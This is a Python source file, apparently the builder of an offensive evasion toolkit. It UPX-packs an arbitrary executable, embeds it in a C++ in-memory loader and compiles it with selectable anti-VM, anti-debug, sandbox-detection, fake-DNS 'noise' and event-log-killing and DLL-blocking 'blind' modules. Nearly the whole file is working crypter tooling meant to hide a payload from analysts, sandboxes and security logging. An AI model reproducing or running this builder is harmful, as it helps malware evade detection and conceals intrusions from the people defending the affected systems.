from multiprocessing.dummy import Process
import os
import subprocess
from .consts import *
from .bin2array import do_conversion
from .modules import *

class Noiser:
    def __init__(self, bin_path) -> None:
        self.bin_path = f"{os.path.splitext(bin_path)[0]}_upx.exe"
        upx_filepath = os.path.join(os.path.dirname(__file__), "upx.exe")
        subprocess.call([upx_filepath, "-o", self.bin_path, "-f", bin_path])
        self.script_dir = os.path.dirname(os.path.realpath(__file__))
        self.include_path = os.path.join(self.script_dir, "include") 
        self.defines_path = os.path.join(self.include_path, FILENAME_DEFINES_HEADER) 
        open(self.defines_path, "w").close()

    def addNoise(self, noise):
        noise_type = type(noise)
        if noise_type == PrintNoise:
            self.__add_def(PRINT_NOISE_ENABLED)
            self.__add_def(TEMPLATE_PRINT_NOISE_TEXT.format(noise.text))
        elif noise_type == RegistryNoise:
            self.__add_def(REGISTRY_NOISE_ENABLED)
        elif noise_type == DnsNoise:
            self.__add_def(DNS_NOISE_ENABLED)
            
            wordlist = []
            with open(WORDLIST_FILEPATH, "r") as rf:
                wordlist = ', '.join(["\"" + i.strip('\n') + "\""  for i in rf.readlines()])
            tld = []
            with open(TLD_FILEPATH, "r") as rf:
                tld = ', '.join(["\"" + i.strip('\n') + "\""  for i in rf.readlines()]) 
            dns_path = os.path.join(self.include_path, FILENAME_DNS_NOISE_HEADER) 
            with open(dns_path, "w") as f:
                f.write("#pragma once\n\n#include <vector>\n#include <string>\n\n")
                f.write(TEMPLATE_DNS_NOISE_WORDLIST_ARG.format(wordlist))
                f.write(TEMPLATE_DNS_NOISE_TLD_ARG.format(tld))

        elif noise_type == FileNoise:
            self.__add_def(FILE_NOISE_ENABLED)

        elif noise_type == NetworkNoise:
            self.__add_def(NETWORK_NOISE_ENABLED)

    def addAnalysis(self, analysis):
        analysis_type = type(analysis)
        if analysis_type == DnsAnalysis:
            self.__add_def(DNS_ANALYSIS_ENABLED)

            fake_dns = []
            with open(FAKE_DOMAINS_FILEPATH, "r") as rf:
                fake_dns = ', '.join(["\"" + i.strip('\n') + "\""  for i in rf.readlines()])
            real_dns = []
            with open(RESOLVED_DOMAINS_FILEPATH, "r") as rf:
                real_dns = ', '.join(["\"" + i.strip('\n') + "\""  for i in rf.readlines()])
            dns_path = os.path.join(self.include_path, FILENAME_DNS_ANALYSIS_HEADER) 
            with open(dns_path, "w") as f:
                f.write("#pragma once\n\n#include <vector>\n#include <string>\n\n")
                f.write(TEMPLATE_DNS_ANALYSIS_FAKE_ARG.format(fake_dns))
                f.write(TEMPLATE_DNS_ANALYSIS_REAL_ARG.format(real_dns))

        elif analysis_type == MACAddrAnalysis:
            self.__add_def(MAC_ANALYSIS_ENABLED)
            # os.makedirs("antivm")

            mac_blacklist_path = os.path.join(self.include_path, FILENAME_MAC_ANALYSIS_HEADER)
            with open(mac_blacklist_path, "w") as wf:
                mac_blacklist = ', '.join(["\"" + i.strip('\n') + "\""  for i in analysis.blacklist])
                wf.write("#pragma once\n\n#include <vector>\n#include <string>\n\n")
                wf.write(TEMPLATE_MAC_ANALYSIS_ARG.format(mac_blacklist))

        elif analysis_type == CPUIDAnalysis:
            self.__add_def(CPUID_ANALYSIS_ENABLED)

        elif analysis_type == DebugAnalysis:
            self.__add_def(DEBUG_ANALYSIS_ENABLED)

        elif analysis_type == ProcessAnalysis:
            self.__add_def(PROCESS_ANALYSIS_ENABLED)
            process_list = "".join([f"\"{i}\",\n" for i in analysis.process_list])
            process_list_path = os.path.join(self.include_path, FILENAME_PROCESS_ANALYSIS)
            with open(process_list_path, "w") as wf:
                wf.write("#pragma once\n\n#include <vector>\n#include <string>\n\n")
                wf.write(TEMPLATE_PROCESS_ANALYSIS_ARG.format(process_list))

        elif analysis_type == SleepAnalysis:
            self.__add_def(SLEEP_ANALYSIS_ENABLED)
            self.__add_def(TEMPLATE_SLEEP_ANALYSIS_ARG.format(analysis.sleep_time))


    def addBlind(self, blind):
        blind_type = type(blind)
        if blind_type == EventlogBlind:
            self.__add_def(EVENTLOG_BLIND_ENABLED)
        elif blind_type == ACGBlind:
            self.__add_def(ACG_BLIND_ENABLED)
        elif blind_type == BlockDLLBlind:
            self.__add_def(BLOCKDLL_BLIND_ENABLED)

    def __add_def(self, content):
        with open(self.defines_path, "a") as f:
            f.write(TEMPLATE_DEFINE.format(content))

    def __bin_to_header(self):
        print(f"Embedding {self.bin_path}")
        with open(self.bin_path, "rb") as f:
            bin_raw = f.read()
        bin_hex = do_conversion(bin_raw)
        binexp_path = os.path.join(self.include_path, FILENAME_BINEXP_HEADER) 
        with open(binexp_path, "w") as f:
            f.write(TEMPLATE_CHAR_ARRAY.format(bin_hex))
        os.remove(self.bin_path)

    def generate(self, fname=FILENAME_NOISY):
        self.__bin_to_header()
        os.chdir(self.script_dir)
        print(f"Compiling {fname}")
        subprocess.run(
            [
                "g++",
                "-o",
                fname,
                "src/DllLoader/MemoryModule.c",
                "src/DllLoader/main.cpp",
                "src/DllLoader/loader.cpp",
                "src/modules/dns.cpp",
                "src/modules/anti-debug.cpp",
                "src/modules/anti-vm.cpp",
                "src/modules/file.cpp",
                "src/modules/network.cpp",
                "src/modules/print.cpp",
                "src/modules/registry.cpp",
                "src/modules/killeventlog.cpp",
                "src/modules/acg.cpp",
                "src/modules/blockdlls.cpp",
                "-static",
                "-Iinclude",
                "-lws2_32",
                "-lIphlpapi",
                "-lpsapi",
                "-DPSAPI_VERSION=1"
            ]
        )
        print(f"Success")
